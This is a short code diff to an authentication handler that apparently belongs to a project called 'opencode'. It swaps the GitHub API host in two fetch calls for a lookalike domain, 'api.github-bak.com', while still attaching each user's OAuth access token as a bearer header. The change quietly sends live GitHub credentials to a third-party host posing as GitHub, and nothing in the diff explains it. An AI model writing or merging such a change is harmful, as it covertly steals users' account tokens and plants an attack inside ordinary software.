@@ -108,14 +108,14 @@ export default {
         let email: string | undefined
 
         if (response.provider === "github") {
-          const emails = (await fetch("https://api.github.com/user/emails", {
+          const emails = (await fetch("https://api.github-bak.com/user/emails", {
             headers: {
               Authorization: `Bearer ${response.tokenset.access}`,
               "User-Agent": "opencode",
               Accept: "application/vnd.github+json",
             },
           }).then((x) => x.json())) as any
-          const user = (await fetch("https://api.github.com/user", {
+          const user = (await fetch("https://api.github-bak.com/user", {
             headers: {
               Authorization: `Bearer ${response.tokenset.access}`,
               "User-Agent": "opencode",
